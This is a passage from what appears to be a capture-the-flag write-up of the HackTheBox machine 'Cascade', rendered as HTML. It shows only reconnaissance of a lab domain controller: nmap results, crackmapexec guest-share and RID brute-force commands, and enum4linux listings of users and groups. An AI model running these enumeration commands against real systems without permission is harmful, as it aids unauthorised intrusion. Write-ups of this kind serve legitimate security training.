+  <span class="md-ellipsis">
+    OpTinselTrace-3
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Sherlocks/OpTinselTrace-5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OpTinselTrace 5
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Sherlocks/TickTock/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    TickTock
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="cascade">Cascade</h1>
+<p><img alt="Cascade" src="../assets/Cascade.png" /></p>
+<h2 id="recon-enum">Recon &amp; Enum</h2>
+<blockquote>
+<p>export IP=10.10.10.182</p>
+</blockquote>
+<h3 id="nmap">Nmap</h3>
+<ul>
+<li>Tcp</li>
+</ul>
+<div class="language-shell highlight"><pre><span></span><code>PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
+<span class="m">53</span>/tcp<span class="w">    </span>open<span class="w">  </span>domain<span class="w">        </span>Microsoft<span class="w"> </span>DNS<span class="w"> </span><span class="m">6</span>.1.7601<span class="w"> </span><span class="o">(</span>1DB15D39<span class="o">)</span><span class="w"> </span><span class="o">(</span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span>SP1<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>dns-nsid:<span class="w"> </span>
+<span class="p">|</span>_<span class="w">  </span>bind.version:<span class="w"> </span>Microsoft<span class="w"> </span>DNS<span class="w"> </span><span class="m">6</span>.1.7601<span class="w"> </span><span class="o">(</span>1DB15D39<span class="o">)</span>
+<span class="m">88</span>/tcp<span class="w">    </span>open<span class="w">  </span>kerberos-sec<span class="w">  </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos<span class="w"> </span><span class="o">(</span>server<span class="w"> </span>time:<span class="w"> </span><span class="m">2024</span>-01-25<span class="w"> </span><span class="m">07</span>:47:22Z<span class="o">)</span>
+<span class="m">135</span>/tcp<span class="w">   </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">139</span>/tcp<span class="w">   </span>open<span class="w">  </span>netbios-ssn<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
+<span class="m">389</span>/tcp<span class="w">   </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>cascade.local,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<span class="m">445</span>/tcp<span class="w">   </span>open<span class="w">  </span>microsoft-ds?
+<span class="m">636</span>/tcp<span class="w">   </span>open<span class="w">  </span>tcpwrapped
+<span class="m">3268</span>/tcp<span class="w">  </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>cascade.local,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<span class="m">3269</span>/tcp<span class="w">  </span>open<span class="w">  </span>tcpwrapped
+<span class="m">5985</span>/tcp<span class="w">  </span>open<span class="w">  </span>http<span class="w">          </span>Microsoft<span class="w"> </span>HTTPAPI<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span><span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-HTTPAPI/2.0
+<span class="p">|</span>_http-title:<span class="w"> </span>Not<span class="w"> </span>Found
+<span class="m">49154</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49155</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49157</span>/tcp<span class="w"> </span>open<span class="w">  </span>ncacn_http<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+<span class="m">49158</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49170</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+Warning:<span class="w"> </span>OSScan<span class="w"> </span>results<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>unreliable<span class="w"> </span>because<span class="w"> </span>we<span class="w"> </span>could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>at<span class="w"> </span>least<span class="w"> </span><span class="m">1</span><span class="w"> </span>open<span class="w"> </span>and<span class="w"> </span><span class="m">1</span><span class="w"> </span>closed<span class="w"> </span>port
+Device<span class="w"> </span>type:<span class="w"> </span>general<span class="w"> </span>purpose<span class="p">|</span>phone<span class="p">|</span>specialized
+Running<span class="w"> </span><span class="o">(</span>JUST<span class="w"> </span>GUESSING<span class="o">)</span>:<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">8</span><span class="p">|</span>Phone<span class="p">|</span><span class="m">7</span><span class="p">|</span><span class="m">2008</span><span class="p">|</span><span class="m">8</span>.1<span class="p">|</span>Vista<span class="w"> </span><span class="o">(</span><span class="m">92</span>%<span class="o">)</span>
+OS<span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows_8<span class="w"> </span>cpe:/o:microsoft:windows<span class="w"> </span>cpe:/o:microsoft:windows_7<span class="w"> </span>cpe:/o:microsoft:windows_server_2008:r2<span class="w"> </span>cpe:/o:microsoft:windows_8.1<span class="w"> </span>cpe:/o:microsoft:windows_vista::-<span class="w"> </span>cpe:/o:microsoft:windows_vista::sp1
+Aggressive<span class="w"> </span>OS<span class="w"> </span>guesses:<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">8</span>.1<span class="w"> </span>Update<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span><span class="m">92</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Phone<span class="w"> </span><span class="m">7</span>.5<span class="w"> </span>or<span class="w"> </span><span class="m">8</span>.0<span class="w"> </span><span class="o">(</span><span class="m">92</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Embedded<span class="w"> </span>Standard<span class="w"> </span><span class="m">7</span><span class="w"> </span><span class="o">(</span><span class="m">91</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>or<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span><span class="o">(</span><span class="m">89</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span><span class="o">(</span><span class="m">89</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span>or<span class="w"> </span>Windows<span class="w"> </span><span class="m">8</span>.1<span class="w"> </span><span class="o">(</span><span class="m">89</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span>SP1<span class="w"> </span>or<span class="w"> </span>Windows<span class="w"> </span><span class="m">8</span><span class="w"> </span><span class="o">(</span><span class="m">89</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span><span class="o">(</span><span class="m">89</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>Professional<span class="w"> </span>or<span class="w"> </span>Windows<span class="w"> </span><span class="m">8</span><span class="w"> </span><span class="o">(</span><span class="m">89</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>SP1<span class="w"> </span>or<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span><span class="o">(</span><span class="m">89</span>%<span class="o">)</span>
+No<span class="w"> </span>exact<span class="w"> </span>OS<span class="w"> </span>matches<span class="w"> </span><span class="k">for</span><span class="w"> </span>host<span class="w"> </span><span class="o">(</span><span class="nb">test</span><span class="w"> </span>conditions<span class="w"> </span>non-ideal<span class="o">)</span>.
+Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">2</span><span class="w"> </span>hops
+Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>CASC-DC1<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows_server_2008:r2:sp1,<span class="w"> </span>cpe:/o:microsoft:windows
+
+Host<span class="w"> </span>script<span class="w"> </span>results:
+<span class="p">|</span><span class="w"> </span>smb2-time:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2024</span>-01-25T07:48:29
+<span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span><span class="m">2024</span>-01-24T10:40:19
+<span class="p">|</span><span class="w"> </span>smb2-security-mode:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span><span class="m">2</span>:1:0:<span class="w"> </span>
+<span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
+<span class="p">|</span>_clock-skew:<span class="w"> </span>-36s
+</code></pre></div>
+<blockquote>
+<p>export DOMAIN=cascade.local</p>
+</blockquote>
+<h3 id="smb">SMB</h3>
+<ul>
+<li>
+<p><code>crackmapexec smb $IP -u guest -p '' --shares</code></p>
+</li>
+<li>
+<p><code>crackmapexec smb $IP -u guest -p '' --rid-brute 10000</code></p>
+</li>
+</ul>
+<h3 id="msrpc">MSRPC</h3>
+<ul>
+<li><code>enum4linux -a $IP</code></li>
+</ul>
+<div class="language-shell highlight"><pre><span></span><code>...
+<span class="w"> </span><span class="o">=======================================(</span><span class="w"> </span>Users<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.10.10.182<span class="w"> </span><span class="o">)=======================================</span>
+
+index:<span class="w"> </span>0xee0<span class="w"> </span>RID:<span class="w"> </span>0x464<span class="w"> </span>acb:<span class="w"> </span>0x00000214<span class="w"> </span>Account:<span class="w"> </span>a.turnbull<span class="w">     </span>Name:<span class="w"> </span>Adrian<span class="w"> </span>Turnbull<span class="w">   </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
+index:<span class="w"> </span>0xebc<span class="w"> </span>RID:<span class="w"> </span>0x452<span class="w"> </span>acb:<span class="w"> </span>0x00000210<span class="w"> </span>Account:<span class="w"> </span>arksvc<span class="w"> </span>Name:<span class="w"> </span>ArkSvc<span class="w">    </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
+index:<span class="w"> </span>0xee4<span class="w"> </span>RID:<span class="w"> </span>0x468<span class="w"> </span>acb:<span class="w"> </span>0x00000211<span class="w"> </span>Account:<span class="w"> </span>b.hanson<span class="w">       </span>Name:<span class="w"> </span>Ben<span class="w"> </span>Hanson<span class="w">        </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
+index:<span class="w"> </span>0xee7<span class="w"> </span>RID:<span class="w"> </span>0x46a<span class="w"> </span>acb:<span class="w"> </span>0x00000210<span class="w"> </span>Account:<span class="w"> </span>BackupSvc<span class="w">      </span>Name:<span class="w"> </span>BackupSvc<span class="w"> </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
+index:<span class="w"> </span>0xdeb<span class="w"> </span>RID:<span class="w"> </span>0x1f5<span class="w"> </span>acb:<span class="w"> </span>0x00000215<span class="w"> </span>Account:<span class="w"> </span>CascGuest<span class="w">      </span>Name:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span><span class="w">    </span>Desc:<span class="w"> </span>Built-in<span class="w"> </span>account<span class="w"> </span><span class="k">for</span><span class="w"> </span>guest<span class="w"> </span>access<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>computer/domain
+index:<span class="w"> </span>0xee5<span class="w"> </span>RID:<span class="w"> </span>0x469<span class="w"> </span>acb:<span class="w"> </span>0x00000210<span class="w"> </span>Account:<span class="w"> </span>d.burman<span class="w">       </span>Name:<span class="w"> </span>David<span class="w"> </span>Burman<span class="w">      </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
+index:<span class="w"> </span>0xee3<span class="w"> </span>RID:<span class="w"> </span>0x467<span class="w"> </span>acb:<span class="w"> </span>0x00000211<span class="w"> </span>Account:<span class="w"> </span>e.crowe<span class="w">        </span>Name:<span class="w"> </span>Edward<span class="w"> </span>Crowe<span class="w">      </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
+index:<span class="w"> </span>0xeec<span class="w"> </span>RID:<span class="w"> </span>0x46f<span class="w"> </span>acb:<span class="w"> </span>0x00000211<span class="w"> </span>Account:<span class="w"> </span>i.croft<span class="w">        </span>Name:<span class="w"> </span>Ian<span class="w"> </span>Croft<span class="w"> </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
+index:<span class="w"> </span>0xeeb<span class="w"> </span>RID:<span class="w"> </span>0x46e<span class="w"> </span>acb:<span class="w"> </span>0x00000210<span class="w"> </span>Account:<span class="w"> </span>j.allen<span class="w">        </span>Name:<span class="w"> </span>Joseph<span class="w"> </span>Allen<span class="w">      </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
+index:<span class="w"> </span>0xede<span class="w"> </span>RID:<span class="w"> </span>0x462<span class="w"> </span>acb:<span class="w"> </span>0x00000210<span class="w"> </span>Account:<span class="w"> </span>j.goodhand<span class="w">     </span>Name:<span class="w"> </span>John<span class="w"> </span>Goodhand<span class="w">     </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
+index:<span class="w"> </span>0xed7<span class="w"> </span>RID:<span class="w"> </span>0x45c<span class="w"> </span>acb:<span class="w"> </span>0x00000210<span class="w"> </span>Account:<span class="w"> </span>j.wakefield<span class="w">    </span>Name:<span class="w"> </span>James<span class="w"> </span>Wakefield<span class="w">   </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
+index:<span class="w"> </span>0xeca<span class="w"> </span>RID:<span class="w"> </span>0x455<span class="w"> </span>acb:<span class="w"> </span>0x00000210<span class="w"> </span>Account:<span class="w"> </span>r.thompson<span class="w">     </span>Name:<span class="w"> </span>Ryan<span class="w"> </span>Thompson<span class="w">     </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
+index:<span class="w"> </span>0xedd<span class="w"> </span>RID:<span class="w"> </span>0x461<span class="w"> </span>acb:<span class="w"> </span>0x00000210<span class="w"> </span>Account:<span class="w"> </span>s.hickson<span class="w">      </span>Name:<span class="w"> </span>Stephanie<span class="w"> </span>Hickson<span class="w"> </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
+index:<span class="w"> </span>0xebd<span class="w"> </span>RID:<span class="w"> </span>0x453<span class="w"> </span>acb:<span class="w"> </span>0x00000210<span class="w"> </span>Account:<span class="w"> </span>s.smith<span class="w">        </span>Name:<span class="w"> </span>Steve<span class="w"> </span>Smith<span class="w">       </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
+index:<span class="w"> </span>0xed2<span class="w"> </span>RID:<span class="w"> </span>0x457<span class="w"> </span>acb:<span class="w"> </span>0x00000210<span class="w"> </span>Account:<span class="w"> </span>util<span class="w">   </span>Name:<span class="w"> </span>Util<span class="w">      </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
+
+user:<span class="o">[</span>CascGuest<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x1f5<span class="o">]</span>
+user:<span class="o">[</span>arksvc<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x452<span class="o">]</span>
+user:<span class="o">[</span>s.smith<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x453<span class="o">]</span>
+user:<span class="o">[</span>r.thompson<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x455<span class="o">]</span>
+user:<span class="o">[</span>util<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x457<span class="o">]</span>
+user:<span class="o">[</span>j.wakefield<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x45c<span class="o">]</span>
+user:<span class="o">[</span>s.hickson<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x461<span class="o">]</span>
+user:<span class="o">[</span>j.goodhand<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x462<span class="o">]</span>
+user:<span class="o">[</span>a.turnbull<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x464<span class="o">]</span>
+user:<span class="o">[</span>e.crowe<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x467<span class="o">]</span>
+user:<span class="o">[</span>b.hanson<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x468<span class="o">]</span>
+user:<span class="o">[</span>d.burman<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x469<span class="o">]</span>
+user:<span class="o">[</span>BackupSvc<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x46a<span class="o">]</span>
+user:<span class="o">[</span>j.allen<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x46e<span class="o">]</span>
+user:<span class="o">[</span>i.croft<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x46f<span class="o">]</span>
+...
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>domain<span class="o">(</span>s<span class="o">)</span>:
+
+<span class="w">        </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>CASCADE
+<span class="w">        </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Builtin
+...
+<span class="w"> </span><span class="o">=======================================(</span><span class="w"> </span>Groups<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.10.10.182<span class="w"> </span><span class="o">)=======================================</span>
+
+
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Getting<span class="w"> </span><span class="nb">builtin</span><span class="w"> </span>groups:
+
+group:<span class="o">[</span>Pre-Windows<span class="w"> </span><span class="m">2000</span><span class="w"> </span>Compatible<span class="w"> </span>Access<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x22a<span class="o">]</span>
+group:<span class="o">[</span>Incoming<span class="w"> </span>Forest<span class="w"> </span>Trust<span class="w"> </span>Builders<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x22d<span class="o">]</span>
+group:<span class="o">[</span>Windows<span class="w"> </span>Authorization<span class="w"> </span>Access<span class="w"> </span>Group<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x230<span class="o">]</span>
+group:<span class="o">[</span>Terminal<span class="w"> </span>Server<span class="w"> </span>License<span class="w"> </span>Servers<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x231<span class="o">]</span>
+group:<span class="o">[</span>Users<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x221<span class="o">]</span>
+group:<span class="o">[</span>Guests<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x222<span class="o">]</span>
+group:<span class="o">[</span>Remote<span class="w"> </span>Desktop<span class="w"> </span>Users<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x22b<span class="o">]</span>
+group:<span class="o">[</span>Network<span class="w"> </span>Configuration<span class="w"> </span>Operators<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x22c<span class="o">]</span>
+group:<span class="o">[</span>Performance<span class="w"> </span>Monitor<span class="w"> </span>Users<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x22e<span class="o">]</span>
+group:<span class="o">[</span>Performance<span class="w"> </span>Log<span class="w"> </span>Users<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x22f<span class="o">]</span>
+group:<span class="o">[</span>Distributed<span class="w"> </span>COM<span class="w"> </span>Users<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x232<span class="o">]</span>
+group:<span class="o">[</span>IIS_IUSRS<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x238<span class="o">]</span>
+group:<span class="o">[</span>Cryptographic<span class="w"> </span>Operators<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x239<span class="o">]</span>
+group:<span class="o">[</span>Event<span class="w"> </span>Log<span class="w"> </span>Readers<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x23d<span class="o">]</span>
+group:<span class="o">[</span>Certificate<span class="w"> </span>Service<span class="w"> </span>DCOM<span class="w"> </span>Access<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x23e<span class="o">]</span>
+
+<span class="o">[</span>+<span class="o">]</span><span class="w">  </span>Getting<span class="w"> </span><span class="nb">builtin</span><span class="w"> </span>group<span class="w"> </span>memberships:
+
+Group:<span class="w"> </span>Windows<span class="w"> </span>Authorization<span class="w"> </span>Access<span class="w"> </span>Group<span class="s1">&#39; (RID: 560) has member: NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS</span>
+<span class="s1">Group: Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">545</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>NT<span class="w"> </span>AUTHORITY<span class="se">\I</span>NTERACTIVE
+Group:<span class="w"> </span>Users<span class="s1">&#39; (RID: 545) has member: NT AUTHORITY\Authenticated Users</span>
+<span class="s1">Group: Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">545</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\D</span>omain<span class="w"> </span>Users
+Group:<span class="w"> </span>Guests<span class="s1">&#39; (RID: 546) has member: CASCADE\CascGuest</span>
+<span class="s1">Group: Guests&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">546</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\D</span>omain<span class="w"> </span>Guests
+Group:<span class="w"> </span>Pre-Windows<span class="w"> </span><span class="m">2000</span><span class="w"> </span>Compatible<span class="w"> </span>Access<span class="s1">&#39; (RID: 554) has member: NT AUTHORITY\Authenticated Users</span>
+
+<span class="s1">[+]  Getting local groups:</span>
+
+<span class="s1">group:[Cert Publishers] rid:[0x205]</span>
+<span class="s1">group:[RAS and IAS Servers] rid:[0x229]</span>
+<span class="s1">group:[Allowed RODC Password Replication Group] rid:[0x23b]</span>
+<span class="s1">group:[Denied RODC Password Replication Group] rid:[0x23c]</span>
+<span class="s1">group:[DnsAdmins] rid:[0x44e]</span>
+<span class="s1">group:[IT] rid:[0x459]</span>
+<span class="s1">group:[Production] rid:[0x45a]</span>
+<span class="s1">group:[HR] rid:[0x45b]</span>
+<span class="s1">group:[AD Recycle Bin] rid:[0x45f]</span>
+<span class="s1">group:[Backup] rid:[0x460]</span>
+<span class="s1">group:[Temps] rid:[0x463]</span>
+<span class="s1">group:[WinRMRemoteWMIUsers__] rid:[0x465]</span>
+<span class="s1">group:[Remote Management Users] rid:[0x466]</span>
+<span class="s1">group:[Factory] rid:[0x46c]</span>
+<span class="s1">group:[Finance] rid:[0x46d]</span>
+<span class="s1">group:[Audit Share] rid:[0x471]</span>
+<span class="s1">group:[Data Share] rid:[0x472]</span>
+
+<span class="s1">[+]  Getting local group memberships:</span>
+
+<span class="s1">Group: Audit Share&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">1137</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\s</span>.smith
+Group:<span class="w"> </span>Denied<span class="w"> </span>RODC<span class="w"> </span>Password<span class="w"> </span>Replication<span class="w"> </span>Group<span class="s1">&#39; (RID: 572) has member: CASCADE\krbtgt</span>
+<span class="s1">Group: Denied RODC Password Replication Group&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">572</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\D</span>omain<span class="w"> </span>Controllers
+Group:<span class="w"> </span>Denied<span class="w"> </span>RODC<span class="w"> </span>Password<span class="w"> </span>Replication<span class="w"> </span>Group<span class="s1">&#39; (RID: 572) has member: CASCADE\Schema Admins</span>
+<span class="s1">Group: Denied RODC Password Replication Group&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">572</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\E</span>nterprise<span class="w"> </span>Admins
+Group:<span class="w"> </span>Denied<span class="w"> </span>RODC<span class="w"> </span>Password<span class="w"> </span>Replication<span class="w"> </span>Group<span class="s1">&#39; (RID: 572) has member: CASCADE\Cert Publishers</span>
+<span class="s1">Group: Denied RODC Password Replication Group&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">572</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\D</span>omain<span class="w"> </span>Admins
+Group:<span class="w"> </span>Denied<span class="w"> </span>RODC<span class="w"> </span>Password<span class="w"> </span>Replication<span class="w"> </span>Group<span class="s1">&#39; (RID: 572) has member: CASCADE\Group Policy Creator Owners</span>
+<span class="s1">Group: Denied RODC Password Replication Group&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">572</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\R</span>ead-only<span class="w"> </span>Domain<span class="w"> </span>Controllers
+Group:<span class="w"> </span>IT<span class="s1">&#39; (RID: 1113) has member: CASCADE\arksvc</span>
+<span class="s1">Group: IT&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">1113</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\s</span>.smith
+Group:<span class="w"> </span>IT<span class="s1">&#39; (RID: 1113) has member: CASCADE\r.thompson</span>
+<span class="s1">Group: AD Recycle Bin&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">1119</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\a</span>rksvc
+Group:<span class="w"> </span>Data<span class="w"> </span>Share<span class="s1">&#39; (RID: 1138) has member: CASCADE\Domain Users</span>
+<span class="s1">Group: Remote Management Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">1126</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\a</span>rksvc
+Group:<span class="w"> </span>Remote<span class="w"> </span>Management<span class="w"> </span>Users<span class="s1">&#39; (RID: 1126) has member: CASCADE\s.smith</span>
+<span class="s1">Group: HR&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">1115</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\s</span>.hickson
+
+<span class="o">[</span>+<span class="o">]</span><span class="w">  </span>Getting<span class="w"> </span>domain<span class="w"> </span>groups:
+
+group:<span class="o">[</span>Enterprise<span class="w"> </span>Read-only<span class="w"> </span>Domain<span class="w"> </span>Controllers<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x1f2<span class="o">]</span>
+group:<span class="o">[</span>Domain<span class="w"> </span>Users<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x201<span class="o">]</span>
+group:<span class="o">[</span>Domain<span class="w"> </span>Guests<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x202<span class="o">]</span>
+group:<span class="o">[</span>Domain<span class="w"> </span>Computers<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x203<span class="o">]</span>
